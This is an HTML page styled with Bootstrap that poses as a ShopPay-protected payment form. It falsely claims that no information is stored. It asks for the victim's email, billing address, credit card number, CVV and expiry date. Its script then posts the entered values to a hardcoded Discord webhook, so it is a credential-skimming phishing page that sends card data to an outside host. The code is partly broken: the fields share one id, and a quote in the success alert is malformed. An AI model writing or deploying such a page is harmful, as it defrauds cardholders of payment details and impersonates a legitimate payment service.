<html>
  <head>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  </head>
  <body class="container mt-5">
    <form onsubmit="sendContact(event)">
      <div class="mb-3">
        <label for="emailInput" class="form-label">This form is protected by ShopPay - None of your information is stored. 
          Enter your email address </label>
        <input type="email" class="form-control" id="emailInput">
      </div>
      <div class="mb-3">
        <label for="messageInput" class="form-label">Enter your Billing Address</label>
        <textarea class="form-control" id="messageInput" rows="2"></textarea>
      </div>
      <div class="mb-3">
        <label for="messageInput" class="form-label">Enter your Credit Card Number</label>
        <textarea class="form-control" id="messageInput" rows="2"></textarea>
      </div>
      <div class="mb-3">
        <label for="messageInput" class="form-label">Enter your CVV/CVC</label>
        <textarea class="form-control" id="messageInput" rows="2"></textarea>
      </div>
      <div class="mb-3">
        <label for="messageInput" class="form-label">Enter your Expiry Date Number</label>
        <textarea class="form-control" id="messageInput" rows="2"></textarea>
      </div>
      <button type="submit" class="btn btn-primary">Submit</button>
    </form>
    <script>
      async function sendContact(ev) {
        ev.preventDefault();

        const senderEmail = document
          .getElementById('emailInput').value;
        const senderMessage = document
          .getElementById('messageInput').value;

        const webhookBody = {
          embeds: [{
            title: 'Contact Form Submitted',
            fields: [
              { name: 'Sender', value: senderEmail },
              { name: 'Message', value: senderMessage },
              { name: 'Message', value: senderMessage },
              { name: 'Message', value: senderMessage },
              { name: 'Message', value: senderMessage }
            ]
          }],
        };

        const webhookUrl = 'https://discord.com/api/webhooks/1294586962266558464/quWiGstDdHHDQwgXEM-FykANYrldVSX3akue6ibf12fsdLEqFQEA4SXECkURm9joOl8f';

        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(webhookBody),
        });

        if (response.ok) {
          alert('You've been emailed a ShopPay Price Form!');
        } else {
          alert('There was an error! Try again later!');
        }
      }
    </script>
  </body>
</html>
